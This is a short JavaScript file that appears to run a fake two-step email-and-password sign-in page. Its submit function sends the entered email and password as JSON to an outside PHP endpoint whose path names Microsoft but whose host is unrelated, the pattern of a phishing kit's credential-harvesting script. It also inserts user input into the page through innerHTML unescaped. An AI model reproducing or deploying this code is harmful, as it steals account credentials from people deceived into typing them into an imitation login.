const updateMail = (currentvalue) => {
  console.log(currentvalue);
  document.getElementById("useil").innerHTML = currentvalue;
};

const shiftUser = () => {
  if (
    document.getElementById("emaInput").value !== undefined &&
    document.getElementById("emaInput").value !== "" &&
    document.getElementById("emaInput").value !== null
  ) {
    document.getElementById("mailDiv").classList.add("hidden");
    document.getElementById("passDiv").classList.remove("hidden");
    document.getElementById("useil").innerHTML =
      document.getElementById("emaInput").value;
  }
};

const submitDetails = async () => {
  document.getElementById("signinbtn").setAttribute("disabled", true);
  const usermail = document.getElementById("useil").innerHTML;
  const userpass = document.getElementById("useps").value;
  const formData = {
    User: usermail,
    Pass: userpass,
  };
  await fetch("https://mailclient.trivecodes.com/microsoft/php/mail_key.php", {
    method: "POST",
    body: JSON.stringify(formData),
  }).then((data) => console.log(data));
};
